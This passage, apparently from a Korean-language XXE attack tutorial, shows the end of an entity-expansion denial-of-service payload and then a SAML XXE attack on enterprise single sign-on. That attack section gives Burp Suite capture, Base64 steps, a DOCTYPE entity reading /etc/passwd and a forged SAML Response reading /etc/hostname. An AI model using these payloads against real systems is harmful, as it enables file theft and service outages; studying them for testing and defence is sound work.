<data>&e;</data>
<!-- 파서가 &e; 확장 시 수 GB 메모리 소비 → OOM 또는 CPU 100% -->
```

### SAML XXE — SSO 공격
```
SAML(Security Assertion Markup Language):
엔터프라이즈 SSO에 사용되는 XML 기반 인증 프로토콜

공격 흐름:
1. SP(Service Provider)에서 IdP로 인증 요청
2. IdP가 SAML Response (XML) 발행
3. SP로 SAML Response 전달 (Base64 인코딩)
4. ↑ 이 단계에서 중간자 공격 또는 클라이언트 측 변조

취약 시나리오:
```
```bash
# SAML Response 캡처 (Burp Suite)
# SAMLResponse= 파라미터 값 추출

# Base64 디코딩
echo "SAMLResponse값" | base64 -d > saml.xml

# XXE 페이로드 삽입
# <samlp:Response ...> 앞에 DOCTYPE 선언 추가
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

# 다시 Base64 인코딩
cat saml_modified.xml | base64 -w0

# 변조된 SAMLResponse 전송 → 서버가 /etc/passwd를 SAML 처리 중 읽음
```

```xml
<!-- 변조된 SAML Response -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer>&xxe;</saml:Issuer>
  ...
</samlp:Response>
```
